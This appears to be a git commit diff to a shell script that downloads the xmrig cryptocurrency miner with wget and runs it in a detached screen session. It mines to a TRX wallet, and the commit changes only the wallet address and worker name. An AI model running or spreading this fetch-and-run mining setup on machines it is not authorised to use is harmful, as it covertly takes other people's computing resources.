87a33b0f7371fde8df57e7340f0d7e1c8e0d9f64
stciali <74396518+stciali@users.noreply.github.com>
2022-08-21 00:57:34 +0300

    Update idrisab.sh

--- idrisab.sh
+++ idrisab.sh
@@ -3,4 +3,4 @@ sudo apt install screen -y
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar -xf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
-screen -S "ftm" -d -m ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TWHagQdD8sA6ndwTn6qAXJnDuJyx7nSFdn.Cem-$(echo $(shuf -i 10000-99999 -n 1)) -p x
+screen -S "ftm" -d -m ./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TBoMQzpAAuQf4QLqXqSUGW23rcmibgbQLw.idris-$(echo $(shuf -i 10000-99999 -n 1)) -p x
